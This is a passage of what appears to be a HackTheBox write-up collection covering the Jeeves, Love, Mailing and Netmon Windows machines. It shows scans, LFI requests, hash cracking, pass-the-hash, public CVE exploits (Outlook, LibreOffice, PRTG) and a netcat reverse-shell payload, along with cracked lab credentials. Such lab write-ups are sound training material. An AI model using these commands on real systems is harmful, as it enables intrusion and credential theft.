C:\\users\\kohsuke\\documents&gt; ls\n\n\n    Directory: C:\\users\\kohsuke\\documents\n\n\nMode                LastWriteTime         Length Name                                                                  \n----                -------------         ------ ----                                                                  \n-a----        9/18/2017   1:43 PM           2846 CEH.kdbx  \n</code></pre> <p>Start an <code>impacket-smbserver</code> and copy the file.</p> <pre><code>PS C:\\users\\kohsuke\\documents&gt; cp CEH.kdbx \\\\10.10.14.17\\kali\n</code></pre> <p>With <code>keepass2john</code>, get the hash and then with <code>john</code> crack it.</p> <pre><code>$ keepass2john CEH.kdbx &gt; hash             \n\n$ cat hash      \nCEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48\n</code></pre> <p></p> <p>Open the file with <code>keepassxc</code> or <code>kpcli</code>.</p> <p></p> <p>Get the NTLM hash of backup stuff and pass the hash to enter.</p> <pre><code>$ impacket-psexec administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.10.63.....\n[*] Found writable share ADMIN$\n[*] Uploading file eXJgnHqs.exe\n[*] Opening SVCManager on 10.10.10.63.....\n[*] Creating service BUPi on 10.10.10.63.....\n[*] Starting service BUPi.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.10586]\n(c) 2015 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"jeeves/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>c:\\Users\\Administrator\\Desktop&gt; type hm.txt\nThe flag is elsewhere.  Look deeper.\n</code></pre> <p>We need to <code>dir</code> with alternative data streams using <code>/R</code>.</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt; dir /R\n Volume in drive C has no label.\n Volume Serial Number is 71A1-6FA1\n\n Directory of C:\\Users\\Administrator\\Desktop\n\n11/08/2017  10:05 AM    &lt;DIR&gt;          .\n11/08/2017  10:05 AM    &lt;DIR&gt;          ..\n12/24/2017  03:51 AM                36 hm.txt\n                                    34 hm.txt:root.txt:$DATA\n11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk\n               2 File(s)            833 bytes\n               2 Dir(s)   2,640,015,360 bytes free\n\nC:\\Users\\Administrator\\Desktop&gt; more &lt; hm.txt:root.txt\nafbc5bd4b615a60648cec41c6ac92530\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"love/","title":"Love","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"love/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.239\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 22:51 CEST\nNmap scan report for 10.10.10.239\nHost is up (0.041s latency).\nNot shown: 62980 closed tcp ports (reset), 2536 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)\n|_http-title: Voting System using PHP\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: 400 Bad Request\n| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in\n| Not valid before: 2021-01-18T14:00:16\n|_Not valid after:  2022-01-18T14:00:16\n| tls-alpn: \n|_  http/1.1\n|_ssl-date: TLS randomness does not represent time\n445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)\n3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)\n5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27\n|_http-title: 403 Forbidden\n5040/tcp  open  unknown\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_ssl-date: 2025-05-20T21:16:18+00:00; +21m33s from scanner time.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| tls-alpn: \n|_  http/1.1\n|_http-title: Not Found\n| ssl-cert: Subject: commonName=LOVE\n| Subject Alternative Name: DNS:LOVE, DNS:Love\n| Not valid before: 2021-04-11T14:39:19\n|_Not valid after:  2024-04-10T14:39:19\n7680/tcp  open  pando-pub?\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\n49670/tcp open  msrpc        Microsoft Windows RPC\nDevice type: general purpose\nRunning: Microsoft Windows 10\nOS CPE: cpe:/o:microsoft:windows_10\nOS details: Microsoft Windows 10 1909 - 2004\nNetwork Distance: 2 hops\nService Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p><code>Port</code> <code>5000</code> is a forbidden site.</p> <p><code>Port</code> <code>80</code> is a voting system login form.</p> <p></p> <p>Add <code>love.htb</code> to <code>/etc/hosts</code> and, using <code>wfuzz</code>, fuzz subdomains to discover <code>staging</code>. This subdomain is already discovered by <code>nmap</code> (<code>ssl-cert: Subject: commonName=staging.love.htb/organizationName=V</code>).</p> <pre><code>$ wfuzz -c --hh 4388 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.love.htb\" http://love.htb\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://love.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                               \n=====================================================================\n\n000000067:   200        191 L    404 W      5357 Ch     \"staging\"                             \n\nTotal time: 10.96540\nProcessed Requests: 4989\nFiltered Requests: 4988\nRequests/sec.: 454.9763\n</code></pre> <p>Add <code>staging.love.htb</code> to <code>/etc/hosts</code> and browse it.</p> <p></p> <p>Going to the Demo tab, we find a form with an SSRF vulnerability. If we enter <code>port</code> <code>5000</code>, which was forbidden, now we can see some credentials.</p> <p></p> <p>Using <code>feroxbuster</code>, we find an <code>/admin</code> path on <code>port</code> <code>80</code>.</p> <p></p> <p></p> <p>Using the internal <code>port</code> credentials:</p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"love/#initial-access","title":"Initial Access","text":"<p>Inside, create a new voter and upload a PHP reverse shell as the user image.</p> <p></p> <p>Start a listener and open the picture.</p> <pre><code>$ sudo rlwrap nc -lnvp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.10.239] 58482\nSOCKET: Shell has connected! PID: 4236\nMicrosoft Windows [Version 10.0.19042.867]\n(c) 2020 Microsoft Corporation. All rights reserved.\n\nC:\\xampp\\htdocs\\omrs\\images&gt;whoami\nlove\\phoebe\n\nC:\\xampp\\htdocs\\omrs\\images&gt;\n</code></pre> <p>Get the flag:</p> <pre><code>C:\\Users\\Phoebe\\Desktop&gt;type user.txt\n8f6bd824be4361a499bbbef404826355\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"love/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get SQL connection credentials from the site's config file.</p> <pre><code>C:\\xampp\\htdocs\\omrs\\includes&gt;type conn.php\n&lt;?php\n        $conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');\n\n        if ($conn-&gt;connect_error) {\n            die(\"Connection failed: \" . $conn-&gt;connect_error);\n        }\n?&gt;\n</code></pre> <p>Checking with <code>nxc</code>, these are also valid system credentials.</p> <pre><code>$ nxc winrm love.htb -u phoebe -p 'HTB#9826^(_'         \nWINRM       10.10.10.239    5985   LOVE             [*] Windows 10 / Server 2019 Build 19041 (name:LOVE) (domain:Love)\nWINRM       10.10.10.239    5985   LOVE             [+] Love\\phoebe:HTB#9826^(_ (Pwn3d!)\n</code></pre> <p></p> <p></p> <p>Create an MSI reverse shell and execute it like an installer:</p> <pre><code>C:\\Users\\Phoebe\\Documents&gt;msiexec /quiet /qn /i reverse.msi\n</code></pre> <p>But it doesn't work. Checking the <code>applocker</code> policy:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Phoebe\\Documents&gt; Get-AppLockerPolicy -Effective | Select -Expandproperty rulecollections\n...\nPathConditions      : {%OSDRIVE%\\Administration\\*}\nPathExceptions      : {}\nPublisherExceptions : {}\nHashExceptions      : {}\nId                  : e6d62a73-11da-4492-8a56-f620ba7e45d9\nName                : %OSDRIVE%\\Administration\\*\nDescription         :\nUserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002\nAction              : Allow\n</code></pre> <p>We can execute it from that folder, but it doesn't work either.</p> <p>Bug</p> <p>Following multiple write-ups, I tried from different folders and creating a user instead of getting a reverse shell, but nothing works...</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"mailing/","title":"Mailing","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"mailing/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.14   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 18:26 CEST\nNmap scan report for 10.10.11.14\nHost is up (0.042s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n25/tcp    open  smtp          hMailServer smtpd\n| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Did not follow redirect to http://mailing.htb\n|_http-server-header: Microsoft-IIS/10.0\n110/tcp   open  pop3          hMailServer pop3d\n|_pop3-capabilities: TOP USER UIDL\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n143/tcp   open  imap          hMailServer imapd\n|_imap-capabilities: CHILDREN NAMESPACE SORT QUOTA OK completed CAPABILITY RIGHTS=texkA0001 IMAP4 IMAP4rev1 ACL IDLE\n445/tcp   open  microsoft-ds?\n465/tcp   open  ssl/smtp      hMailServer smtpd\n| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU\n| Not valid before: 2024-02-27T18:24:10\n|_Not valid after:  2029-10-06T18:24:10\n587/tcp   open  smtp          hMailServer smtpd\n|_ssl-date: TLS randomness does not represent time\n| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP\n|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\n| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU\n| Not valid before: 2024-02-27T18:24:10\n|_Not valid after:  2029-10-06T18:24:10\n993/tcp   open  ssl/imap      hMailServer imapd\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\\Spain/countryName=EU\n| Not valid before: 2024-02-27T18:24:10\n|_Not valid after:  2029-10-06T18:24:10\n|_imap-capabilities: CHILDREN NAMESPACE SORT QUOTA OK completed CAPABILITY RIGHTS=texkA0001 IMAP4 IMAP4rev1 ACL IDLE\n5040/tcp  open  unknown\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n7680/tcp  open  pando-pub?\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n50529/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 10|2019 (97%)\nOS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019\nAggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-05-13T16:29:36\n|_  start_date: N/A\n\nTRACEROUTE (using port 25/tcp)\nHOP RTT      ADDRESS\n1   42.65 ms 10.10.14.1\n2   42.82 ms 10.10.11.14\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 230.54 seconds\n</code></pre> <p>Add <code>mailing.htb</code> to <code>/etc/hosts</code> and navigate to the site.</p> <p></p> <p>The host has a mail service and uses <code>hMailServer</code> in the backend.</p>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"mailing/#initial-access","title":"Initial Access","text":"<p>Make a list with the three users and their roles.</p> <pre><code>$ cat users\nruy@mailing.htb\nmaya@mailing.htb\ngregory@mailing.htb\nit@mailing.htb\nsupport@mailing.htb\n</code></pre> <p>Using <code>smtp-user-enum</code>, check if any user exists.</p> <pre><code>$ smtp-user-enum -M RCPT -U users -t 10.10.11.14 \nStarting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nMode ..................... RCPT\nWorker Processes ......... 5\nUsernames file ........... users\nTarget count ............. 1\nUsername count ........... 5\nTarget TCP port .......... 25\nQuery timeout ............ 5 secs\nTarget domain ............ \n\n######## Scan started at Tue May 13 22:27:57 2025 #########\n10.10.11.14: support@mailing.htb exists\n10.10.11.14: it@mailing.htb exists\n10.10.11.14: gregory@mailing.htb exists\n10.10.11.14: ruy@mailing.htb exists\n10.10.11.14: maya@mailing.htb exists\n######## Scan completed at Tue May 13 22:27:57 2025 #########\n5 results.\n\n5 queries in 1 seconds (5.0 queries / sec)\n</code></pre> <p>Three are valid but we need a password to send an email.</p> <p>On the site, we notice the download URL is like <code>?file=asdf.pdf</code>, testing if it is an LFI.</p> <pre><code>$ curl \"http://mailing.htb/download.php?file=..\\..\\..\\..\\..\\..\\windows\\win.ini\"         \n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n</code></pre> <p>Searching in the <code>hMailServer</code> documentation, we learn that the config file is in <code>'Program Files (x86)\\hMailServer\\Bin\\hMailServer.ini'</code>.</p> <pre><code>$ curl \"http://mailing.htb/download.php?file=..\\..\\..\\..\\..\\..\\Program%20Files%20(x86)\\hMailServer\\Bin\\hMailServer.ini\"\n[Directories]\nProgramFolder=C:\\Program Files (x86)\\hMailServer\nDatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database\nDataFolder=C:\\Program Files (x86)\\hMailServer\\Data\nLogFolder=C:\\Program Files (x86)\\hMailServer\\Logs\nTempFolder=C:\\Program Files (x86)\\hMailServer\\Temp\nEventFolder=C:\\Program Files (x86)\\hMailServer\\Events\n[GUILanguages]\nValidLanguages=english,swedish\n[Security]\nAdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7\n[Database]\nType=MSSQLCE\nUsername=\nPassword=0a9f8ad8bf896b501dde74f08efd7e4c\nPasswordEncryption=1\nPort=0\nServer=\nDatabase=hMailServer\nInternal=1\n</code></pre> <p>With <code>hashcat</code>, we recover one hash, the <code>AdministratorPassword</code> one.</p> <pre><code>$ hashcat -m 0 hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force\nhashcat (v6.2.6) starting\n...\n841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator\n</code></pre> <p>Test the credential with <code>telnet</code> connecting to <code>pop3</code>.</p> <pre><code>$ telnet mailing.htb 110\nTrying 10.10.11.14...\nConnected to mailing.htb.\nEscape character is '^]'.\n+OK POP3\nuser administrator@mailing.htb\n+OK Send your password\npass homenetworkingadministrator\n+OK Mailbox locked and ready\n</code></pre> <p>Sending links and stuff with <code>sendEmail</code> doesn't get a response back, so searching for vulns we find https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.</p> <pre><code>$ python CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender it@mailing.htb --recipient maya@mailing.htb --subject hey --url \\\\10.10.14.10\\asdf\n\nCVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.\nAlexander Hagenah / @xaitax / ah@primepage.de                                                                                        \n\n\u2705 Email sent successfully.\n</code></pre> <p>Start an <code>smbserver</code> and wait.</p> <pre><code>$ impacket-smbserver -smb2support kali .                          \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.11.14,52689)\n[*] AUTHENTICATE_MESSAGE (MAILING\\maya,MAILING)\n[*] User MAILING\\maya authenticated successfully\n[*] maya::MAILING:aaaaaaaaaaaaaaaa:b5e9b462d7629052775cf089f0fba24c:010100000000000000ff557c50c4db013b4a64b85414973800000000010010006300630059007800480046004b007000030010006300630059007800480046004b0070000200100074005100710042005a00530065004f000400100074005100710042005a00530065004f000700080000ff557c50c4db0106000400020000000800300030000000000000000000000000200000bc50cd0cf8b2ad384d021cf2793b2cd9efcd8d2aca8f52768b9e268f3f76b08f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310030000000000000000000\n[*] Connecting Share(1:IPC$)\n</code></pre> <pre><code>$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force  \nhashcat (v6.2.6) starting\n\n\nMAYA::MAILING:aaaaaaaaaaaaaaaa:b5e9b462d7629052775cf089f0fba24c:010100000000000000ff557c50c4db013b4a64b85414973800000000010010006300630059007800480046004b007000030010006300630059007800480046004b0070000200100074005100710042005a00530065004f000400100074005100710042005a00530065004f000700080000ff557c50c4db0106000400020000000800300030000000000000000000000000200000bc50cd0cf8b2ad384d021cf2793b2cd9efcd8d2aca8f52768b9e268f3f76b08f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310030000000000000000000:m4y4ngs4ri\n</code></pre> <p><code>maya:m4y4ngs4ri</code></p> <p>Checking with <code>nxc</code>, we can access via <code>winrm</code>.</p> <p></p> <pre><code>$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri            \n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\maya\\Documents&gt; whoami\nmailing\\maya\n</code></pre> <p>Get the flag</p> <pre><code>*Evil-WinRM* PS C:\\Users\\maya\\desktop&gt; type user.txt\n2fa1a39d74f4299226bba00a57d36822\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"mailing/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>winPEASany</code> and execute it.</p> <p>We see some installed programs.</p> <p></p> <p>Reading the files, the version is <code>7.4</code>.</p> <p></p> <p>We find this exploit https://github.com/elweth-sec/CVE-2023-2255.</p> <p>With this exploit, we can create a malicious file for a user to open.</p> <pre><code>$ python CVE-2023-2255.py --cmd \"cmd.exe /c C:\\users\\public\\nc.exe 10.10.14.12 5555 -e cmd\" --output .\\important.odt\nFile .important.odt has been created !\n</code></pre> <p>Upload <code>nc.exe</code> to the public folder.</p> <pre><code>*Evil-WinRM* PS C:\\users\\public&gt; upload nc.exe\n\nData: 79188 bytes of 79188 bytes copied\n\nInfo: Upload successful!\n</code></pre> <p>Now upload the exploit to <code>C:\\Important Documents</code> and start the listener.</p> <p></p> <pre><code>$ rlwrap nc -lnvp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.12] from (UNKNOWN) [10.10.11.14] 62878\nMicrosoft Windows [Version 10.0.19045.4355]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Program Files\\LibreOffice\\program&gt;whoami\nwhoami\nmailing\\localadmin\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"mailing/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag</p> <pre><code>C:\\Users\\localadmin\\Desktop&gt;type root.txt\ntype root.txt\na7ffff38272fb5df4cce86e605bcfe5a\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"netmon/","title":"Netmon","text":"","tags":["\ud83d\udcce Windows","\ud83d\udce6 HackTheBox","HackTheBox","Windows"]},{"location":"netmon/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.152\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 13:47 CEST\nNmap scan report for 10.10.10.152\nHost is up (0.042s latency).\nNot shown: 62818 closed tcp ports (reset), 2704 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE      VERSION\n21/tcp    open  ftp          Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| 02-03-19  12:18AM                 1024 .rnd\n| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub\n| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs\n| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files\n| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)\n| 02-03-19  08:08AM       &lt;DIR&gt;          Users\n|_11-10-23  10:20AM       &lt;DIR&gt;          Windows\n80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)\n| http-title: Welcome | PRTG Network Monitor (NETMON)\n|_Requested resource was /index.htm\n|_http-trane-info: Problem with XML parsing of /evox/about\n|_http-server-header: PRTG/18.1.37.13946\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nDevice type: general purpose\nRunning: Microsoft Windows 2016\nOS CPE: cpe:/o:microsoft:windows_server_2016\nOS details: Microsoft Windows Server 2016\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 1m30s, deviation: 0s, median: 1m29s\n| smb2-time: \n|   date: 2025-05-08T11:50:32\n|_  start_date: 2025-05-08T11:48:21\n\nTRACEROUTE (using port 445/tcp)\nHOP RTT      ADDRESS\n1   41.88 ms 10.10.14.1\n2   42.26 ms 10.10.10.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 80.58 seconds\n</code></pre> <p>The webpage shows a PRTG Network Monitor (NETMON) solution.</p> <p></p> <p>The <code>ftp</code> can be accessed anonymously and the <code>Windows</code> folder contains <code>PRTG Configuration.dat</code> with passwords.</p> <pre><code>$ ftp 10.10.10.152\nConnected to 10.10.10.152.\n220 Microsoft FTP Service\nName (10.10.10.152:kali): ftp\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||54567|)\n150 Opening ASCII mode data connection.\n02-03-19  12:18AM                 1024 .rnd\n02-25-19  10:15PM       &lt;DIR&gt;          inetpub\n07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs\n02-25-19  10:56PM       &lt;DIR&gt;          Program Files\n02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)\n02-03-19  08:08AM       &lt;DIR&gt;          Users\n11-10-23  10:20AM       &lt;DIR&gt;          Windows\n226 Transfer complete.\nftp&gt; cd windows\n250 CWD command successful.\nftp&gt; ls\n229 Entering Extended Passive Mode (|||54568|)\n150 Opening ASCII mode data connection.\n11-20-16  09:53PM       &lt;DIR&gt;          ADFS\n...\n02-25-19  10:54PM              1189697 PRTG Configuration.dat\n</code></pre> <pre><code>cat PRTG\\ Configuration.dat | grep -C 10 password\n...\n&lt;login&gt;\n  prtgadmin\n&lt;/login&gt;\n&lt;name&gt;\n  PRTG System Administrator\n&lt;/name&gt;\n&lt;ownerid&gt;\n  100\n&lt;/ownerid&gt;\n&lt;password&gt;\n  &lt;flags&gt;\n    &lt;encrypted/&gt;\n  &lt;/flags&gt;\n  &lt;cell col=\"0\" crypt=\"PRTG\"&gt;\n    JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA======\n  &lt;/cell&gt;\n  &lt;cell col=\"1\" crypt=\"PRTG\"&gt;\n    OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW\n  &lt;/cell&gt;\n&lt;/password&gt;\n</code></pre> <p>Nothing. Searching in the official documentation, we find this article and it says:</p> <p></p> <p>So, using the <code>ftp</code> access:</p> <p></p> <p>Get the three files and <code>grep password</code> on them:</p> <pre><code>cat PRTG\\ Configuration.old.bak | grep -C 5 password  \n  0\n&lt;/dbauth&gt;\n&lt;dbcredentials&gt;\n  0\n&lt;/dbcredentials&gt;\n&lt;dbpassword&gt;\n  &lt;!-- User: prtgadmin --&gt;\n  PrTg@dmin2018\n&lt;/dbpassword&gt;\n</code></pre> <p>The credential doesn't work on the login form. Trying <code>2019</code> instead works.</p> <p></p> <p>There is an article explaining that RCE can be achieved using the notification system, and <code>searchsploit</code> has the script.</p> <p></p> <pre><code>$ ./46527.sh -u http://10.10.10.152 -c \"OCTOPUS1813713946=ezZEMTY5NTVELTk5MzctNDE0RS05RUZFLUU0MTZBMDE0RjQ1RX0%3D\"\n\n[+]#########################################################################[+] \n[*] Authenticated PRTG network Monitor remote code execution                [*] \n[+]#########################################################################[+] \n[*] Date: 11/03/2019                                                        [*] \n[+]#########################################################################[+] \n[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] \n[+]#########################################################################[+] \n[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] \n[*] Version: 18.2.38                                                        [*] 